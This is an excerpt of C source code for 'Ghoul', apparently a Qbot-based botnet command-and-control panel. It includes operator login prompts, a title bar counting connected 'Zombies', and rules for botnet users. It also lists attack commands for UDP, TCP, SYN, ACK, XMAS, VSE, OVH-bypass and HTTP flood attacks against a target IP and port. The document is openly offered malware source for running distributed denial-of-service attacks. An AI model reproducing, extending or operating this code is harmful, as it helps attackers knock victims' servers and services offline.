...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
        ...
        sprintf(user, "\e[38;5;93mUsername:\e[0m\e[30m: ");
        ...
        sprintf(password, "\e[38;5;93mPassword:\e[0m\e[30m: ", accounts[find_line].username);
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; %d Zombies | Ghoul  %c", '\033', BotsConnected(), '\007');
  ...
  sprintf(ascii_banner_line1,  "\e[38;5;93m                                ╔═╗╦ ╦╔═╗╦ ╦╦                  \e[38;5;93m\r\n");
  sprintf(ascii_banner_line2,  "\e[38;5;93m                                ║ ╦╠═╣║ ║║ ║║                  \e[38;5;93m\r\n");
  sprintf(ascii_banner_line3,  "\e[38;5;93m                                ╚═╝╩ ╩╚═╝╚═╝╩═╝ V2 Edo            \e[38;5;93m\r\n");
  sprintf(ascii_banner_line4,  "\e[38;5;93m                  ╔══════════════════════════════════════════╗  \e[38;5;93m\r\n");
  sprintf(ascii_banner_line5,  "\e[38;5;93m                ╔═╝                                          ╚═╗\e[38;5;93m\r\n");
  sprintf(ascii_banner_line6,  "\e[38;5;93m                ║        \e[0mType \e[38;5;93mHELP \e[0mFor List Of Commands\e[38;5;93m        ║\e[38;5;93m\r\n");
  sprintf(ascii_banner_line7,  "\e[38;5;93m                ╚═╗                                          ╔═╝\e[38;5;93m\r\n");
  sprintf(ascii_banner_line8,  "\e[38;5;93m                  ╚══════════════════════════════════════════╝  \e[38;5;93m\r\n");
  ...
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "count") || strstr(buf, "Count") || strstr(buf, "COUNT") || strstr(buf, "bots") || strstr(buf, "BOTS")) {
				...
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[90mBots\e[38;5;93m:\e[90m  [\e[0m%d\e[90m]\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(ops,         "\e[90mUsers\e[38;5;93m:\e[90m [\e[0m%d\e[90m]\r\n", OperatorsConnected, scannerreport);
				sprintf(statuscount, "\e[90mDups\e[38;5;93m:\e[90m  [\e[0m%d\e[90m]\r\n", TELFound, scannerreport);
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "credit") || strstr(buf, "Owner") || strstr(buf, "CREDIT") || strstr(buf, "edo") || strstr(buf, "yqro") || strstr(buf, "PORTS")) {
                ...
                sprintf(s2,  "\e[38;5;93m    ╔══════════════════════════════════════════╗ \r\n");
                sprintf(s3,  "\e[38;5;93m  ╔═╝                                          ╚═╗\r\n");         
                sprintf(s4,  "\e[38;5;93m  ║        \e[90mGhoul Was Made By Edo And Yqro        \e[38;5;93m║\r\n");
                sprintf(s5,  "\e[38;5;93m  ╚═╗                                          ╔═╝\r\n");
                sprintf(s6,  "\e[38;5;93m    ╚══════════════════════════════════════════╝ \r\n");         
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "Help") || strstr(buf, "commands") || strstr(buf, "command") || strstr(buf, "COMMAND")) {
				...
				sprintf(hp2, "\e[38;5;93m  ╔═══════════════════════════════════════╗           \r\n");
				sprintf(hp3, "\e[38;5;93m╔═╝ \e[90mMETHODS Shows Attack Commands\e[38;5;93m         ╚═╗         \r\n");
				sprintf(hp4, "\e[38;5;93m║   \e[90mRULES   Shows Botnet Rules To Follow\e[38;5;93m    ║         \r\n");
				sprintf(hp5, "\e[38;5;93m║   \e[90mBOTS    Shows Count Of Bots/Users/Dups\e[38;5;93m  ║         \r\n");
				sprintf(hp6, "\e[38;5;93m║   \e[90mCLEAR   Clears Screen, Back To Banner\e[38;5;93m   ║         \r\n");
				sprintf(hp6, "\e[38;5;93m║   \e[90mCREDIT   SHOWS WHO MADE THIS SHIT\e[38;5;93m       ║         \r\n");
				sprintf(hp7, "\e[38;5;93m╚═╗ \e[90mLOGOUT  Closes Out Putty Session\e[38;5;93m      ╔═╝         \r\n");
				sprintf(hp8, "\e[38;5;93m  ╚═══════════════════════════════════════╝           \r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
				...
				sprintf(p2,  "\e[38;5;93m  ╔════════════════════════════════════╗       \r\n");
				sprintf(p3,  "\e[38;5;93m╔═╝ \e[90mRULE 1 NO SHARING NET IP\e[38;5;93m           ╚═╗     \r\n");
				sprintf(p4,  "\e[38;5;93m║   \e[90mRULE 2 NO SPAMMING ATTACKS\e[38;5;93m           ║     \r\n");
				sprintf(p5,  "\e[38;5;93m║   \e[90mRULE 3 NO SHARING NET LOGIN INFO\e[38;5;93m     ║     \r\n");
				sprintf(p6,  "\e[38;5;93m║   \e[90mRULE 4 NO HITTING GOVERMENT SITES\e[38;5;93m    ║     \r\n"); 
				sprintf(p7,  "\e[38;5;93m╚═╗ \e[90mRULE 5 NO ATTACKS LONGER THAN 800\e[38;5;93m  ╔═╝     \r\n");                       
				sprintf(p8,  "\e[38;5;93m  ╚════════════════════════════════════╝       \r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				...
				sprintf(lsg,  "\e[38;5;93m                     ╔════════════════╗                                \r\n");
				sprintf(lsh,  "\e[38;5;93m                     ║  M E T H O D S ║                                \r\n");
				sprintf(ls2,  "\e[38;5;93m  ╔══════════════════╩════════════════╩═══════════════════╗            \r\n");
				sprintf(ls3,  "\e[38;5;93m╔═╝ \e[90m!* STD [IP] [PORT] [TIME] - (STD FLOOD )\e[38;5;93m              ╚═╗          \r\n");
				sprintf(ls4,  "\e[38;5;93m║   \e[90m!* UDPREG [IP] [PORT] [TIME] 32 0 10 - (UDP FLOOD)\e[38;5;93m      ║          \r\n");
				sprintf(lsi,  "\e[38;5;93m║   \e[90m!* UDPRAW [IP] [PORT] [TIME] 32 0 10 - (RAW UDP FLOOD)\e[38;5;93m  ║          \r\n");
				sprintf(lsf,  "\e[38;5;93m║   \e[90m!* UDPHEX [IP] [PORT] [TIME] 32 0 10 - (UDPHEX)\e[38;5;93m         ║          \r\n");
				sprintf(ls5,  "\e[38;5;93m║   \e[90m!* TCP [IP] [PORT] [TIME] 32 all 0 10 - (TCP FLOOD)\e[38;5;93m     ║          \r\n");
				sprintf(lsc,  "\e[38;5;93m║   \e[90m!* ACK [IP] [PORT] [TIME] 32 all 0 10 - (ACK FLOOD)\e[38;5;93m     ║          \r\n");
				sprintf(lsd,  "\e[38;5;93m║   \e[90m!* XMAS [IP] [PORT] [TIME] 32 all 0 10 - (XMAS)\e[38;5;93m         ║          \r\n");
				sprintf(lsj,  "\e[38;5;93m║   \e[90m!* SYN [IP] [PORT] [TIME] 32 all 0 10 - (SYN FLOOD)\e[38;5;93m     ║          \r\n");
				sprintf(lsk,  "\e[38;5;93m║   \e[90m!* STOMP [IP] [PORT] [TIME] 32 all 0 10 - (TCP STOMP)\e[38;5;93m   ║          \r\n");
				sprintf(ls6,  "\e[38;5;93m║   \e[90m!* VSE [IP] [PORT] [TIME] 32 1024 10 - (VSE FLOOD)\e[38;5;93m      ║          \r\n");
				sprintf(ls7,  "\e[38;5;93m║   \e[90m!* OVH [IP] [PORT] [TIME] - (OVH BYPASS)\e[38;5;93m                ║          \r\n");
				sprintf(ls8,  "\e[38;5;93m║   \e[90m!* HTTPSTOMP [IP] [PORT] [TIME] 1024 - (HTTP STOMP\e[38;5;93m      ║          \r\n");
				sprintf(lse,  "\e[38;5;93m║   \e[90m!* HTTP [IP] [PORT] [TIME] 1024 - (HTTP Flood\e[38;5;93m           ║          \r\n");
				sprintf(ls9,  "\e[38;5;93m╚═╗ \e[90m!* STOP - (STOPS ALL ATTACKS)\e[38;5;93m                         ╔═╝          \r\n");
				sprintf(lsb,  "\e[38;5;93m  ╚═══════════════════════════════════════════════════════╝            \r\n");
...
int main (int argc, char *argv[], void *sock) {
		...
		port = atoi(argv[3]);
		printf("\e[38;5;93m[+] Welcome To Ghoul Made By Edo and Yqro [+]\n");
        threads = atoi(argv[2]);
...
/* Ghoul Qbot Made was made by Edo Changing or ripping from this code is strickly forbiden
